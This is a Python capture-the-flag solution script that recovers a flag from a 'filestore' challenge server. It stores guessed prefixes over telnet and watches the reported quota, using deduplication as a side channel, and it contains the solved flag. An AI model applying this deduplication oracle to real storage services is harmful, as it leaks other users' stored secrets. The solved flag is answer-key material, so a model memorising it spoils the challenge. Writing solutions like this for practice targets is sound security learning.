#!/usr/bin/env python3
import telnetlib
import string

HOST = "filestore.2021.ctfcompetition.com"
PORT = 1337
FLAG_LENGTH = 27
EXIT_CMD = "exit".encode("ascii") + b"\n"
STORE_CMD = "store".encode("ascii") + b"\n"
STATUS_CMD = "status".encode("ascii") + b"\n"
EXIT_MSG = b"- exit"

flag = "CTF{CR1M3_0f_d3dup1ic4ti0n}"
last_quota = 0.026

printable_chars = [chr(i) for i in range(33, 126)]

tn = telnetlib.Telnet(HOST, port=PORT)

while len(flag) <= FLAG_LENGTH and last_quota < 64.0:
    for char in printable_chars:
        tn.read_until(EXIT_MSG)
        tn.write(STORE_CMD)
        tn.read_until(b"Send me a line of data...")
        flag_candidate = flag + char
        tn.write(flag_candidate.encode('ascii') + b"\n")
        tn.read_until(EXIT_MSG)
        tn.write(STATUS_CMD)
        tn.read_until(b"Quota: ").decode("ascii")
        quota_str = tn.read_until(b"kB").decode("ascii")
        quota = float(quota_str[:-2])
        print(f"{flag=} {flag_candidate=} {last_quota=} {quota=} {quota_str=}")
        if quota == last_quota:
            flag += char
            break
        last_quota = quota

print(f"{flag=}")

tn.write(EXIT_CMD)
